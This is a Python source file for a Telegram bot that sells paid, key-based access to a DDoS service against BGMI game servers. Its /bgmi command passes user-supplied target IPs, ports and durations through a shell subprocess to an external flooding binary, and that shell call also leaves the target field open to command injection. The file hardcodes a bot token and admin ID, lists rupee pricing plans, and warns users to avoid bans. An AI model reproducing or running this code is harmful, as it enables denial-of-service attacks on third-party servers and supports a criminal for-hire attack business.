import telebot
import subprocess
import datetime
import os
import random
import string
import json
import threading
import time

# Bot token and admin user ID (as strings)
bot = telebot.TeleBot('6642742035:AAFU6iz7lIyq8kWrammQhA9b5TsLNr-SaoY')
admin_id = {"6539807903"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# In-memory storage
users = {}
keys = {}
bgmi_cooldown = {}
consecutive_attacks = {}

# Global variables to track attack status
attack_in_progress = False
attack_end_time = None
attack_lock = threading.Lock()

# Global set to track IPs that have already been attacked
attacked_ips = set()

# Data load/save functions
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

# Logging functions
def log_command(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration}\nTime: {datetime.datetime.now()}\n\n")

def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Duration: {duration}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "Logs were already empty."
            else:
                file.truncate(0)
                return "Logs cleared successfully."
    except FileNotFoundError:
        return "Logs file not found."

# Key generation and management functions
def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and a time unit (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅ Key redeemed! Access granted until: {users[user_id]}"
        else:
            response = "Invalid or expired key."
    else:
        response = "Usage: /redeem <key>"
    bot.reply_to(message, response)

# Function to send an attack start reply
def start_attack_reply(message, target, port, duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = (f"{username}, your attack has started.\n\n"
                f"Target: {target}\nPort: {port}\nDuration: {duration} seconds\nDeveloper: BGMI")
    bot.reply_to(message, response)

# Function to run the attack using subprocess
def run_attack(target, port, duration):
    global attack_in_progress, attack_end_time
    full_command = f"./mrin {target} {port} {duration} 600"
    subprocess.run(full_command, shell=True)
    # Once the attack finishes, mark the target IP as attacked and clear the global attack flag
    with attack_lock:
        attacked_ips.add(target)
        attack_in_progress = False
        attack_end_time = None

# /bgmi command handler: Only one attack runs at a time globally and each IP can only be attacked once.
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global attack_in_progress, attack_end_time
    user_id = str(message.chat.id)
    
    # Check user access (paid members only)
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❌ Access expired. Redeem a new key using /redeem <key>."
            bot.reply_to(message, response)
            return
    else:
        response = "💢 Only paid members can use this command. DM to get a key."
        bot.reply_to(message, response)
        return

    # Check if an attack is already in progress globally
    with attack_lock:
        if attack_in_progress:
            remaining = int((attack_end_time - datetime.datetime.now()).total_seconds())
            if remaining > 0:
                response = (f"Another attack is already running. "
                            f"Please wait {remaining} seconds before starting a new attack.")
                bot.reply_to(message, response)
                return
            else:
                # Reset the flag if needed
                attack_in_progress = False
                attack_end_time = None

    # Process command parameters: /bgmi <target> <port> <duration>
    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        try:
            port = int(command[2])
            duration = int(command[3])
            if duration > 240:
                response = "⚠️ Error: Maximum attack duration is 240 seconds."
                bot.reply_to(message, response)
                return

            # Check if this IP has been attacked before
            if target in attacked_ips:
                response = "This IP has already been attacked and cannot be attacked again."
                bot.reply_to(message, response)
                return

            # Log the command
            record_command_logs(user_id, '/bgmi', target, port, duration)
            log_command(user_id, target, port, duration)
            start_attack_reply(message, target, port, duration)

            # Set the global attack flag and expected end time
            with attack_lock:
                attack_in_progress = True
                attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)

            # Run the attack in a separate thread so that the bot remains responsive
            attack_thread = threading.Thread(target=run_attack, args=(target, port, duration))
            attack_thread.start()

            response = f"Attack launched on {target} at port {port} for {duration} seconds."
        except ValueError:
            response = "Error: Please specify a valid port and duration."
    else:
        response = "Usage: /bgmi <target> <port> <duration>"
    bot.reply_to(message, response)

# Other bot commands
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "Only admin can use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if users:
            response = "User List:\n"
            for uid, expiration_date in users.items():
                try:
                    user_info = bot.get_chat(int(uid))
                    username = user_info.username if user_info.username else f"UserID: {uid}"
                    response += f"- @{username} (ID: {uid}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- UserID: {uid} expires on {expiration_date}\n"
        else:
            response = "No users found."
    else:
        response = "Only admin can use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "Only admin can use this command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in users:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your logs:\n" + "".join(user_logs)
                else:
                    response = "No logs found for your commands."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "Access denied."
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = (
        "Commands:\n"
        "/bgmi <target> <port> <duration> - Start an attack (only one attack can run at a time; each IP can only be attacked once).\n"
        "/redeem <key> - Redeem an access key.\n"
        "/id - Show your Telegram ID.\n"
        "/mylogs - Show your command logs.\n"
        "\nAdmin Commands:\n"
        "/genkey <amount> <hours/days> - Generate a key.\n"
        "/allusers - List all users.\n"
        "/logs - Show full logs.\n"
        "/clearlogs - Clear the log file.\n"
        "/broadcast <message> - Broadcast a message to all users."
    )
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = (f"Welcome, {user_name}! This is your BGMI bot service.\n"
                "For help, use the /help command.")
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = (f"{user_name}, please follow these rules:\n"
                "1. Do not run too many attacks to avoid a ban.\n"
                "2. Only one attack can run at a time.\n"
                "3. An IP can only be attacked once.\n"
                "4. Logs are checked daily, so follow the rules!")
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = (f"{user_name}, here is the plan:\n"
                "VIP:\n"
                "-> Attack time: 180 seconds\n"
                "-> Cooldown: 5 minutes after attack\n"
                "-> Concurrent attacks: 3 (but only one attack allowed at a time)\n\n"
                "Free Users:\n"
                "Day: 150 rs\nWeek: 600 rs\nMonth: 1100 rs")
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = (f"{user_name}, available admin commands:\n"
                "/genkey, /allusers, /logs, /clearlogs, /broadcast")
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]
                save_users()
                response = f"User {target_user_id} removed successfully."
            else:
                response = "User not found."
        else:
            response = "Usage: /remove <user_id>"
    else:
        response = "Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message from admin:\n\n" + command[1]
            for uid in users:
                try:
                    bot.send_message(uid, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {uid}: {str(e)}")
            response = "Broadcast message sent to all users."
        else:
            response = "Usage: /broadcast <message>"
    else:
        response = "Only admin can run this command."
    bot.reply_to(message, response)

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print("Error:", e)
            time.sleep(15)